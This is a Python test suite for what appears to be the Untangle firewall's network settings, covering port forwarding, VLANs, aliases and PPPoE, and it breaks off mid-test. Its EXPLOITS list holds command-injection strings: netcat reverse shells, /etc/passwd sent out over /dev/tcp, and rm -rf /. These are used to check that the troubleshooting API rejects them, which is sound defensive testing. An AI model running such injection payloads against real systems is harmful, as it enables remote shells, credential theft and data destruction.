import glob
import socket
import unittest
import pytest
import os
import sys
import re
import subprocess
import pprint
import shutil
import time
import copy
import runtests
import json
import fnmatch

from pathlib import Path

from tests.common import NGFWTestCase
import runtests.test_registry as test_registry
import runtests.remote_control as remote_control
import runtests.overrides as overrides
from . import global_functions
from . import ipaddr
from uvm import Uvm

import tests.test_ipsec_vpn as test_ipsec_vpn

DHCP_RELAY_ADDRESS=overrides.get("DHCP_RELAY_ADDRESS",default=test_ipsec_vpn.IPSEC_HOST_LAN_IP)

ftp_file_name = ""

default_policy_id = 1
orig_netsettings = None
test_untangle_com_ip = socket.gethostbyname(global_functions.TEST_SERVER_HOST)
run_ftp_inbound_tests = None
wan_ip = None
device_in_office = False
dyndns_resolver = "8.8.8.8"
#office_ftp_client = "10.112.56.23"
office_ftp_client = overrides.get('office_ftp_client')
if office_ftp_client is None:
    ftp_server = "10.112.56.23"
#dyndns_resolver = "resolver1.dyndnsinternetguide.com"
    
# Remote BGP NGFW server
BGP_REMOTE = overrides.get("BGP_REMOTE", default={
        "serverAddress": "192.168.58.115",
        "networks": "192.168.58.0",
        "lan_prefix": "24",
        "adminPassword": "passwd"
})


# Local BGP NGFW server
BGP_LOCAL = overrides.get("BGP_LOCAL", default={
    "serverAddress": "192.168.58.112",
    "networks": "192.168.58.0",
    "lan_prefix": "24",
    "adminPassword": "passwd"
  })

EXPLOITS = [
    "10.2",
    "fake.sitex0x0x0000a@",
    "http://ny@domain>freod$",
    "/tmp/traffic.pcap", 
    "eth97",
    "&nc 192.168.56.129:3333 -e /bin/bash",
    "; nc 192.168.56.129:3333 -e /bin/bash",
    "| nc 192.168.56.129:3333 -e /bin/bash",
    "`nc 192.168.56.129:3333 -e /bin/bash`",
    "$(nc 192.168.56.129:3333 -e /bin/bash)",
    "foo; cat /etc/passwd > /dev/tcp/192.168.56.129/3333",
    "foo && rm -rf /",
]

EXPECTED = {
    "CONNECTIVITY": "Testing DNS",
    "REACHABLE": "ping statistics",
    "DNS": "has address",
    "CONNECTION": "(http) open",
    "PATH": "traceroute to",
    "DOWNLOAD": "saved",
    "TRACE": "tcpdump"
}

def get_iface():
    return global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]

def run_exploit_test(command, base_args, key):
    failures = []

    for exploit in EXPLOITS:
        modified = copy.deepcopy(base_args)
        modified[key] = exploit

        result = global_functions.uvmContext.networkManager().runTroubleshooting(command, modified)
        time.sleep(3)

        try:
            assert result is None, (
                f"Exploit succeeded for {command}, key={key}, exploit={exploit}"
            )
        except AssertionError as e:
            failures.append(str(e))

    # After looping all exploits, fail once if anything failed
    if failures:
        raise AssertionError("\n".join(failures))



def run_valid_test(command, args):
    exec_result = global_functions.uvmContext.networkManager().runTroubleshooting(command, args)
    time.sleep(3)

    if command not in EXPECTED:
        assert exec_result.getResult() == 0
        return

    # Read all output
    content = ""
    if exec_result:
        buf = ""
        while True:
            out = exec_result.readFromOutput()
            if out is None:
                break
            buf += out
        content = buf

    assert EXPECTED[command] in content, (
        f"Valid output missing expected string for {command}"
    )


def find_files(dir_path, search_string):
    residual_files = []
    for root, dirs, files in os.walk(dir_path):
        for filename in fnmatch.filter(files, search_string):
            residual_files.append(os.path.join(root, filename))
    return residual_files
    
def create_port_forward_triple_condition( conditionType1, value1, conditionType2, value2, conditionType3, value3, destinationIP, destinationPort):
    return {
        "description": "port forward  -> " + str(destinationIP) + ":" + str(destinationPort) + " test",
        "enabled": True,
        "javaClass": "com.untangle.uvm.network.PortForwardRule",
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.PortForwardRuleCondition",
                    "conditionType": str(conditionType1),
                    "value": str(value1)
                },
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.PortForwardRuleCondition",
                    "conditionType": str(conditionType2),
                    "value": str(value2)
                },
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.PortForwardRuleCondition",
                    "conditionType": str(conditionType3),
                    "value": str(value3)
                }
            ]
        },
        "newDestination": destinationIP,
        "newPort": destinationPort,
        "ruleId": 1
    }

def create_filter_rules( conditionType1, value1, conditionType2, value2, blocked ):
    return {
        "bypass": True,
        "description": "test rule " + str(conditionType1) + " " + str(value1) + " " + str(conditionType2) + " " + str(value2),
        "enabled": True,
        "blocked": blocked,
        "javaClass": "com.untangle.uvm.network.FilterRule",
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
                    "conditionType": str(conditionType1),
                    "value": str(value1)
                },
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
                    "conditionType": str(conditionType2),
                    "value": str(value2)
                }
            ]
        },
        "ruleId": 1
    }

def create_invert_filter_rules( conditionType1, value1, conditionType2, value2, blocked ):
    return {
        "bypass": True,
        "description": "test rule " + str(conditionType1) + " " + str(value1) + " " + str(conditionType2) + " " + str(value2),
        "enabled": True,
        "blocked": blocked,
        "javaClass": "com.untangle.uvm.network.FilterRule",
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": True,
                    "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
                    "conditionType": str(conditionType1),
                    "value": str(value1)
                },
                {
                    "invert": True,
                    "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
                    "conditionType": str(conditionType2),
                    "value": str(value2)
                }
            ]
        },
        "ruleId": 1
    }

def create_bypass_condition_rule( conditionType, value ):
    return {
        "bypass": True,
        "description": "test bypass " + str(conditionType) + " " + str(value),
        "enabled": True,
        "javaClass": "com.untangle.uvm.network.BypassRule",
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.BypassRuleCondition",
                    "conditionType": str(conditionType),
                    "value": str(value)
                },
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.BypassRuleCondition",
                    "conditionType": "PROTOCOL",
                    "value": "TCP,UDP"
                }
            ]
        },
        "ruleId": 1
    }

def create_qos_condition_rule( conditionType, value, priority):
    return {
        "description": "test QoS " + str(conditionType) + " " + str(value),
        "enabled": True,
        "javaClass": "com.untangle.uvm.network.QosRule",
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.QosRuleCondition",
                    "conditionType": str(conditionType),
                    "value": str(value)
                },
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.QosRuleCondition",
                    "conditionType": "PROTOCOL",
                    "value": "TCP,UDP"
                }
            ]
        },
        "priority": priority,
        "ruleId": 3
    }

def create_single_condition_firewall_rule( conditionType, value, blocked=True, flagged=True ):
    return {
        "javaClass": "com.untangle.app.firewall.FirewallRule",
        "id": 1,
        "enabled": True,
        "description": "Single Condition: " + str(conditionType) + " = " + str(value),
        "flag": flagged,
        "block": blocked,
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": False,
                    "javaClass": "com.untangle.app.firewall.FirewallRuleCondition",
                    "conditionType": str(conditionType),
                    "value": str(value)
                    }
                ]
            }
        }

def create_route_rule( networkAddr, netmask, gateway):
    return {
        "description": "test route",
        "javaClass": "com.untangle.uvm.network.StaticRoute",
        "network": networkAddr,
        "nextHop": gateway,
        "prefix": netmask,
        "ruleId": 1,
        "toAddr": True,
        "toDev": False
        }

def create_nat_rule( name, conditionType, value, source):
    return {
        "auto": False,
        "description": name,
        "enabled": True,
        "javaClass": "com.untangle.uvm.network.NatRule",
        "conditions": {
            "javaClass": "java.util.LinkedList",
            "list": [
                {
                    "invert": False,
                    "javaClass": "com.untangle.uvm.network.NatRuleCondition",
                    "conditionType": str(conditionType),
                    "value": value
                }
            ]
        },
        "newSource": source,
        "ruleId": 1
    }

def create_dns_rule( networkAddr, name):
    return {
        "address": networkAddr,
        "javaClass": "com.untangle.uvm.network.DnsStaticEntry",
        "name": name
         }

def create_vlan_interface(interfaceId, name, physicalInterface, symInterface, sysInterface, ipV4address):
    return {
            "addressed": True,
            "bridged": False,
            "configType": "ADDRESSED",
            "dhcpEnabled": False,
            "dhcpOptions": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "disabled": False,
            "interfaceId": interfaceId,
            "isVlanInterface": True,
            "isWan": False,
            "javaClass": "com.untangle.uvm.network.InterfaceSettings",
            "name": name,
            "physicalDev": physicalInterface, #"eth1",
            "raEnabled": False,
            "symbolicDev": symInterface, #"eth1.1",
            "systemDev": sysInterface, #"eth1.1",
            "v4Aliases": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "v4ConfigType": "STATIC",
            "v4NatEgressTraffic": False,
            "v4NatIngressTraffic": False,
            "v4PPPoEPassword": "",
            "v4PPPoEUsePeerDns": False,
            "v4PPPoEUsername": "",
            "v4StaticAddress": ipV4address, #"192.168.14.1",
            "v4StaticNetmask": "255.255.255.0",
            "v4StaticPrefix": 24,
            "v6Aliases": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "v6ConfigType": "STATIC",
            "vlanParent": 2,
            "vlanTag": 1,
            "vrrpAliases": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "vrrpEnabled": False
        }

def create_alias(ipAddress,ipNetmask,ipPrefix):
    return {
            "javaClass": "com.untangle.uvm.network.InterfaceSettings$InterfaceAlias",
            "staticAddress": ipAddress,
            "staticNetmask": ipNetmask,
            "staticPrefix": ipPrefix
        }


def get_http_https_ports():
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    return (netsettings['httpPort'], netsettings['httpsPort'])

def set_htp_https_ports(httpPort, httpsPort):
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    netsettings['httpPort'] = httpPort
    netsettings['httpsPort'] = httpsPort
    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

def set_first_level_rule(newRule,ruleGroup):
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    netsettings[ruleGroup]['list'].insert(0,newRule)
    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

def append_firewall_rule(app, newRule):
    rules = app.getRules()
    rules["list"].append(newRule)
    app.setRules(rules)

def add_dns_rule(newRule):
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    netsettings['dnsSettings']['staticEntries']['list'].insert(0,newRule)
    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

def find_used_ip(start_ip):
    # Find an IP that is not currently used.
    loopLimit = 20
    test_ip = ipaddr.IPAddress(start_ip)
    ip_used = True
    while (ip_used and (loopLimit > 0)):
        loopLimit -= 1
        test_ip += 1
        test_ip_result = subprocess.call(["ping","-c","1",str(test_ip)],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        if test_ip_result != 0:
            ip_used = False

    if ip_used:
        # no unused IP found
        return False
    else:
        return str(test_ip)

def append_vlan(parentInterfaceID):
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    # find the physicalDev of the interface passed in.
    physicalDev = None
    for interface in netsettings['interfaces']['list']:
        if interface['interfaceId'] == parentInterfaceID:
            if interface['configType'] != "ADDRESSED":
                # only use if interface is addressed
                return False
            physicalDev = interface['physicalDev']
            break

    testVLANIP = find_used_ip("1.2.3.4")
    if testVLANIP:
        # no unused IP found
        return False

    # Check thast VLAN ID is not used
    loopLimit = 20
    testVLANID = 100
    vlanIdUsed = True
    while (vlanIdUsed and (loopLimit > 0)):
        testVLANID += 1
        loopLimit -= 1
        vlanIdUsed = False
        testVlanIdDev = physicalDev + "." + str(testVLANID)
        for interface in netsettings['interfaces']['list']:
            if interface['symbolicDev'] == testVlanIdDev:
                # found duplicate VLAN ID
                vlanIdUsed = True
                break

    if vlanIdUsed:
        # no unused VLAN ID found
        return False

    # if valid VLAN interface and IP is available, create a VLAN
    netsettings['interfaces']['list'].append(create_vlan_interface(physicalDev,"network_tests",testVlanIdDev,testVlanIdDev,str(testVLANIP)))
    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
    return testVLANIP

def append_aliases():
    ip_found = False
    netsettings = copy.deepcopy(orig_netsettings)
    for i in range(len(netsettings['interfaces']['list'])):
        if netsettings['interfaces']['list'][i]['configType'] == "ADDRESSED":
            if netsettings['interfaces']['list'][i]['v4ConfigType'] == "STATIC":
                test_start_ip =  netsettings['interfaces']['list'][i]['v4StaticAddress']
                ip_found = find_used_ip(test_start_ip)
                break;
            elif netsettings['interfaces']['list'][i]['v4ConfigType'] == "AUTO":
                nicDevice = str(netsettings['interfaces']['list'][i]['symbolicDev'])
                test_start_ip = global_functions.__get_ip_address(nicDevice)
                ip_found = find_used_ip(test_start_ip)
                break;

    if ip_found:
        netsettings['interfaces']['list'][i]['v4Aliases']['list'].append(create_alias(ip_found,
                                                                         netsettings['interfaces']['list'][i]['v4StaticNetmask'],
                                                                         netsettings['interfaces']['list'][i]['v4StaticPrefix']))
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
    print(("Alias IP: " + ip_found))
    return ip_found

def nuke_first_level_rule(ruleGroup):
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    netsettings[ruleGroup]['list'][:] = []
    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

def nuke_dns_rules():
    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
    netsettings['dnsSettings']['staticEntries']['list'][:] = []
    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

def verify_snmp_walk():
    snmpwalkResult = remote_control.run_command("test -x /usr/bin/snmpwalk")
    if snmpwalkResult:
        raise unittest.SkipTest("Snmpwalk app needs to be installed on client")

def set_snmp_v3_settings( settings, v3Enabled, v3Username, v3AuthenticationProtocol, v3AuthenticationPassphrase, v3PrivacyProtocol, v3PrivacyPassphrase, v3Required ):
    settings['v3Enabled'] = v3Enabled
    settings['v3Username'] = v3Username
    settings['v3AuthenticationProtocol'] = v3AuthenticationProtocol
    settings['v3AuthenticationPassphrase'] = v3AuthenticationPassphrase
    settings['v3PrivacyProtocol'] = v3PrivacyProtocol
    settings['v3PrivacyPassphrase'] = v3PrivacyPassphrase
    settings['v3Required'] = v3Required

    v1v2command = "snmpwalk -v 2c -c atstest " +  global_functions.get_lan_ip() + " | grep untangle"
    v3command = "snmpwalk -v 3 " + " -u " + v3Username + " -l authNoPriv " + " -a " + v3AuthenticationProtocol + " -A " + v3AuthenticationPassphrase + " -x " + v3PrivacyProtocol
    if v3PrivacyPassphrase != "":
        v3command += " -X " + v3PrivacyPassphrase
    v3command += " " +  global_functions.get_lan_ip() + " | grep untangle"

    print(("v1v2command = " + v1v2command))
    return( v1v2command, v3command )

def try_snmp_command(command):
    result = remote_control.run_command( command )
    if (result == 1):
        # there might be a delay in snmp restarting
        time.sleep(5)
        result = remote_control.run_command( command )
    return result

def build_device_to_mac_address_map(devices=[]):
    """
    For the list of devices (e.g.,eth0, eth1)
    return a dictionary mapping of those names to the current system mac addresses
    """
    device_mac_mapping = {}
    for device_name in devices:
        mac_address_filename=f"/sys/class/net/{device_name}/address"
        if not os.path.isfile(mac_address_filename):
            # Mac address doesn't exit
            raise unittest.SkipTest(f"cannot find {mac_address_filename} for {device_name} ")
        with open(mac_address_filename) as file:
            device_mac_mapping[device_name] = file.readline().strip()

    return device_mac_mapping

def remap_nics(device_candidates, original_device_mac_mapping):
    """
    Perform nic remapping by swapping last two candidate devices
    manually to simulate reboot, then restart networking to force the remapping to occur.
    """
    # What do we have in systemd network directory?
    found_device_links = []
    for filename in glob.glob(f"/etc/systemd/network/*"):
        device = filename[filename.rfind("/")+1:]
        device = device[:device.find(".")]
        found_device_links.append(device)
    assert len(set(found_device_links).intersection(device_candidates)) == len(device_candidates), "found same number of link files matching devices"
    assert len(set(found_device_links).difference(device_candidates)) == 0, "no extra link files found"

    # Simulate a system reboot:
    # 1. Swap last two devices with interface mapper
    command=f"/usr/share/untangle/bin/interface-mapping.sh -r {device_candidates[-1]}={device_candidates[-2]}"
    print(command)
    print(subprocess.call(command, shell=True))

    # 2. Gather this modified system mapping, simulating reboot with kernel picking different mac addresses
    modified_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
    print(f"modified_device_mac_mapping={modified_device_mac_mapping}")

    # 3. Restart networking
    command="ifdown -a -v --exclude=lo && ifup -a -v --exclude=lo && /usr/bin/systemctl-wait"
    print(command)
    print(subprocess.call(command, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL))

    # Verify original mapping is preserved
    new_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
    print(f"     new_device_mac_mapping={new_device_mac_mapping}")
    for device in original_device_mac_mapping.keys():
        assert new_device_mac_mapping[device] == original_device_mac_mapping[device], f"{device}: orig and new mac address same"

def get_troubleshooting_output(command=None, arguments={}):
    """
    Troubleshooting commands return an output reader.  Fully read and return the text of output.
    """
    output_reader = None
    try:
        output_reader = global_functions.uvmContext.networkManager().runTroubleshooting(command, arguments)
    except:
        assert False, "could not run command"


    if output_reader is None:
        return "runTroubleshooting returned None (likely blocked or errored)"
    
    all_output = ""
    output = None
    while True:
        time.sleep(.25)
        output = output_reader.readFromOutput()
        if output is None:
            break
        all_output += output

    print("troubleshooting output=")
    print(all_output)

    return all_output

@pytest.mark.network
class NetworkTests(NGFWTestCase):

    not_an_app = True

    @staticmethod
    def module_name():
        return "network"

    @classmethod
    def initial_extra_setup(cls):
        global orig_netsettings, run_ftp_inbound_tests, wan_ip, device_in_office, device_is_pppoe
        if orig_netsettings == None:
            orig_netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        wan_ip = global_functions.uvmContext.networkManager().getFirstWanAddress()
        print(wan_ip)
        device_in_office = global_functions.is_in_office_network(wan_ip)
        device_is_pppoe = global_functions.is_device_pppoe()
        cls.ftpUserName, cls.ftpPassword = global_functions.get_live_account_info("ftp")
        
        if run_ftp_inbound_tests == None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect( ( remote_control.client_ip, 21 ))
                s.close()
                pingResult = subprocess.call(["ping","-c","1",global_functions.ftp_server],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                if pingResult == 0:
                    run_ftp_inbound_tests = True
                else:
                    run_ftp_inbound_tests = False
            except:
                print(("Socket test failed to %s" % remote_control.client_ip))
                run_ftp_inbound_tests = False

    def test_010_client_is_online(self):
        result = remote_control.is_online()
        assert (result == 0)
        
    def test_011_pppoe_complex_password_encrypt_decrypt(self):
        """Verify pppoe connection with complex password"""
        network_manager = global_functions.uvmContext.networkManager()
        system_manager = global_functions.uvmContext.systemManager()
        netsettings = copy.deepcopy(orig_netsettings)

        plain_text_password = "test!1$4@2%5"
        
        # Find a physical interface to base the VLAN on
        physicalDev = None
        for interface in netsettings['interfaces']['list']:
            if interface['configType'] == 'ADDRESSED' and not interface['isVlanInterface']:
                physicalDev = interface['physicalDev']
                break

        if not physicalDev:
            raise unittest.SkipTest("No suitable physical interface found for VLAN")

        # Create a new VLAN ID (e.g., 200) and an IP address for it
        testVLANID = 200
        testVlanIdDev = f"{physicalDev}.{testVLANID}"
        testPPPoEUsername = "testuser"

        # Create a VLAN interface configured for PPPoE with the plain text password
        pppoe_vlan_intf = {
            "addressed": True,
            "bridged": False,
            "configType": "ADDRESSED",
            "dhcpEnabled": False,
            "dhcpOptions": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "disabled": False,
            "interfaceId": -100, # A unique, negative ID for new interfaces
            "isVlanInterface": True,
            "isWan": True, # PPPoE is typically a WAN interface
            "javaClass": "com.untangle.uvm.network.InterfaceSettings",
            "name": f"pppoe_vlan_{testVLANID}",
            "physicalDev": physicalDev,
            "raEnabled": False,
            "symbolicDev": testVlanIdDev,
            "systemDev": testVlanIdDev,
            "v4Aliases": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "v4ConfigType": "PPPOE",
            "v4NatEgressTraffic": False,
            "v4NatIngressTraffic": False,
            "v4PPPoEPassword": plain_text_password, # Pass plain text password to be encrypted by setNetworkSettings
            "v4PPPoEUsePeerDns": True,
            "v4PPPoEUsername": testPPPoEUsername,
            "v4StaticAddress": "", # Not applicable for PPPoE
            "v4StaticNetmask": "", # Not applicable for PPPoE
            "v4StaticPrefix": 0,   # Not applicable for PPPoE
            "v6Aliases": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "v6ConfigType": "STATIC",
            "vlanParent": 2, # Assuming a default parent
            "vlanTag": testVLANID,
            "vrrpAliases": {
                "javaClass": "java.util.LinkedList",
                "list": []
            },
            "vrrpEnabled": False
        }

        # Add the new VLAN interface
        netsettings['interfaces']['list'].append(pppoe_vlan_intf)
        network_manager.setNetworkSettings(netsettings)

        # Verify password in saved settings after setting
        current_netsettings = network_manager.getNetworkSettings()
        print(current_netsettings['interfaces']['list'])
        for interface_entry in current_netsettings['interfaces']['list']:
            if interface_entry.get('name') == "pppoe_vlan_200":
                assert interface_entry.get('v4ConfigType') == 'PPPOE'
                assert interface_entry.get('v4PPPoEUsername') == testPPPoEUsername
                
                # Retrieve the stored (encrypted) password and decrypt it
                # stored_v4pppoe_password = interface_entry.get('v4PPPoEPassword')
                stored_encrypted_password = interface_entry.get('v4PPPoEPasswordEncrypted')
                stored_decrypted_password = system_manager.getDecryptedPassword(stored_encrypted_password)
                # print("stored_v4pppoe_password :"+ stored_v4pppoe_password)
                print("stored_encrypted_password :"+ stored_encrypted_password)
                print("stored_decrypted_password :"+ stored_decrypted_password)
                assert stored_decrypted_password == plain_text_password, "Stored encrypted password could not be decrypted to original"
                break
        
        # Clean up: restore original network settings
        network_manager.setNetworkSettings(orig_netsettings)

    def test_014_add_vlan(self):
        raise unittest.SkipTest("Review changes in test")
        # Add a test static VLAN
        test_vlan_ip = append_vlan(remote_control.interface)
        if test_vlan_ip:
            result = subprocess.call(["ping","-c","1",str(test_vlan_ip)],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
            assert(result == 0)
        else:
            # no VLAN was created so skip test
            unittest.SkipTest("No VLAN or IP address available")
            
    def test_015_add_many_vlans(self):
        network_manager = global_functions.uvmContext.networkManager()
        physicalDev = ""
        assigned_intfs = []
        for interface in network_manager.getNetworkSettings()['interfaces']['list']:
            assigned_intfs += [interface['interfaceId']]
            if interface['interfaceId'] == remote_control.interface and interface['configType'] in ['ADDRESSED','BRIDGED']:
                physicalDev = interface['physicalDev']
        for interface in network_manager.getNetworkSettings()['virtualInterfaces']['list']:
            assigned_intfs += [interface['interfaceId']]
        if not physicalDev:
            unittest.SkipTest("No physical device available")

        max_interfaces = 253
        netspace_manager = global_functions.uvmContext.netspaceManager()
        new_ip = netspace_manager.getAvailableAddressSpace("IPv4", 1).split("/")[0]
        new_netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        for id in range(1, max_interfaces):
            # only adding if not used already
            if id not in assigned_intfs:
                testVlanIdDev = physicalDev + "." + str(id)
                # assigning negative numbers to all interfaces we add, like the ui does
                vlan_intf = create_vlan_interface(id * -1, "network_tests_" + str(id), physicalDev, testVlanIdDev, testVlanIdDev, new_ip)
                new_netsettings['interfaces']['list'].append(vlan_intf)
                new_ip = netspace_manager.getAvailableAddressSpace("IPv4", 1).split("/")[0]
        
        network_manager.setNetworkSettings(new_netsettings)
        num_interfaces  = len(network_manager.getNetworkSettings()['interfaces']       ['list'])
        num_interfaces += len(network_manager.getNetworkSettings()['virtualInterfaces']['list'])
        print(num_interfaces)
        assert(num_interfaces == max_interfaces)
        freeId = network_manager.getNextFreeInterfaceId(network_manager.getNetworkSettings())
        print(freeId)
        assert(freeId == -1)
        
        # Re-setting network settings for other tests
        network_manager.setNetworkSettings(orig_netsettings)

    def test_016_add_alias(self):
        # raise unittest.SkipTest("Review changes in test")
        # Add Alias IP
        alias_ip = append_aliases()
        if alias_ip:
            # print("alias_ip <%s>" % AliasIP)
            result = remote_control.run_command("ping -c 1 %s" % alias_ip)
            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
            result2 = remote_control.run_command("ping -c 1 %s" % alias_ip)
            assert (result == 0)
            assert (result2 != 0)
        else:
            # No alias IP added so just skip
            unittest.SkipTest("No alias address available")

    # test basic port forward (tcp port 80)
    def test_020_port_forward_80(self):
        # networking might not be ready specially on boxes with DHCP WAN
        timeout = 30
        ping_result = 1
        while (timeout > 0 and ping_result != 0):
            timeout -= 1
            print("Try " + str(timeout))
            ping_result = remote_control.run_command("ping -c 1 %s" % test_untangle_com_ip)
        result = remote_control.run_command("ping -c 1 %s" % test_untangle_com_ip)
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","80","DST_ADDR","1.2.3.4","PROTOCOL","TCP",test_untangle_com_ip,80),'portForwardRules')
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri="http://1.2.3.4/test/testPage1.html") + " 2>&1 | grep -q text123")
        assert(result == 0)

        events = global_functions.get_events('Network','Port Forwarded Sessions',None,5)
        assert(events != None)
        found = global_functions.check_events( events.get('list'), 5,
                                               "s_server_addr", test_untangle_com_ip,
                                               "c_client_addr", remote_control.client_ip,
                                               "local_addr", remote_control.client_ip,
                                               "remote_addr", test_untangle_com_ip,
                                               "s_server_port", 80)
        assert(found)

    # test basic port forward (tcp port 443)
    def test_021_port_forward_443(self):
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","443","DST_ADDR","1.2.3.4","PROTOCOL","TCP",test_untangle_com_ip,443),'portForwardRules')
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri="https://1.2.3.4/test/testPage1.html") + " 2>&1 | grep -q text123")
        assert(result == 0)

    # test port forward (changing the port 80 -> 81)
    def test_022_port_forward_new_port(self):
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","81","DST_ADDR","1.2.3.4","PROTOCOL","TCP",test_untangle_com_ip,80),'portForwardRules')
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri="http://1.2.3.4/test/testPage1.html") + " 2>&1 | grep -q text123")
        assert(result == 0)

    # test port forward using DST_LOCAL condition
    def test_023_port_forward_dst_local(self):
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","81","DST_LOCAL","true","PROTOCOL","TCP",test_untangle_com_ip,80),'portForwardRules')
        wan_address = global_functions.uvmContext.networkManager().getFirstWanAddress()
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"http://{wan_address}:81/test/testPage1.html") + " 2>&1 | grep -q text123")
        assert(result == 0)

    # test port forward that uses the http port (move http to different port)
    def test_024_port_forward_port_80_local_http_port(self):
        orig_ports = get_http_https_ports()
        set_htp_https_ports( 8080, 4343 )
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","80","DST_LOCAL","true","PROTOCOL","TCP",test_untangle_com_ip,80),'portForwardRules')
        wan_address = global_functions.uvmContext.networkManager().getFirstWanAddress()
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"http://{wan_address}/test/testPage1.html") + " 2>&1 | grep -q text123")
        set_htp_https_ports( orig_ports[0], orig_ports[1])
        assert(result == 0)

    # test port forward that uses the https port (move https to different port)
    def test_025_port_forward_port_443_local_https_port(self):
        orig_ports = get_http_https_ports()
        set_htp_https_ports( 8080, 4343 )
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","443","DST_LOCAL","true","PROTOCOL","TCP",test_untangle_com_ip,443),'portForwardRules')
        wan_address = global_functions.uvmContext.networkManager().getFirstWanAddress()
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"https://{wan_address}/test/testPage1.html") + " 2>&1 | grep -q text123")
        set_htp_https_ports( orig_ports[0], orig_ports[1])
        assert(result == 0)

    # test hairpin port forward (back to original client)
    def test_026_port_forward_hairpin(self):
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","11234","DST_LOCAL","true","PROTOCOL","TCP",remote_control.client_ip,11234),'portForwardRules')
        remote_control.run_command("nohup netcat -l -p 11234 >/dev/null 2>&1",stdout=False,nowait=True)
        result = remote_control.run_command("echo test | netcat -q0 %s 11234" % global_functions.uvmContext.networkManager().getFirstWanAddress())
        print(("result: %s" % str(result)))
        assert(result == 0)

    # test port forward to multiple ports (tcp port 80,443)
    def test_027_port_forward_multiport(self):
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","80,443","DST_ADDR","1.2.3.4","PROTOCOL","TCP",test_untangle_com_ip,None),'portForwardRules')
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"http://1.2.3.4/test/testPage1.html") + " 2>&1 | grep -q text123")
        assert(result == 0)
        result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"https://1.2.3.4/test/testPage1.html") + " 2>&1 | grep -q text123")
        assert(result == 0)

    # test a port forward from outside if possible
    def test_030_port_forward_inbound(self):
        # We will use iperf_server for this test. Test to see if we can reach it.
        iperf_avail = global_functions.verify_iperf_configuration(wan_ip)
        if (not iperf_avail):
            raise unittest.SkipTest("IperfServer test client unreachable, skipping alternate port forwarding test")
        # Also test that it can probably reach us (we're on a 10.x network)
        if not device_in_office:
            raise unittest.SkipTest("Not on office network, skipping")

        # start netcat on client
        remote_control.run_command("nohup netcat -l -p 11245 >/dev/null 2>&1",stdout=False,nowait=True)

        # port forward 11245 to client box
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","11245","DST_LOCAL","true","PROTOCOL","TCP",remote_control.client_ip,"11245"),'portForwardRules')

        # try connecting to netcat on client from "outside" box
        result = remote_control.run_command("echo test | netcat -q0 " + wan_ip + " 11245", host=global_functions.iperf_server)
        assert (result == 0)

    # test a port forward from outside if possible
    def test_040_port_forward_udp_inbound(self):
